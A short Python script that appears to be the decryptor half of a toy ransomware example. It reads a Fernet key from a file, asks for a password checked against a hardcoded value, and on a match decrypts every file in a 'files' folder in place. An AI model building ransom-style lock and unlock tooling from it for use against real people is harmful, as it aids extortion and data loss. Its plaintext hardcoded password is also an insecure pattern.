#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

TARGET_FOLDER = "files"
files = []

for file in os.listdir(TARGET_FOLDER):
    path = os.path.join(TARGET_FOLDER, file)

    if os.path.isfile(path):
        files.append(path)

print(files)

with open("thekey.key", "rb") as key:
    secretkey = key.read()

passphrase = "GTH3kf7"
upassword = input("Enter the password to decrypt your files: ")

if upassword == passphrase:
    for file in files:
        with open(file, "rb") as f:
            content = f.read()

        decrypted = Fernet(secretkey).decrypt(content)

        with open(file, "wb") as f:
            f.write(decrypted)

    print("You recovered all your files")
else:
    print("Wrong password. Files remain encrypted.")
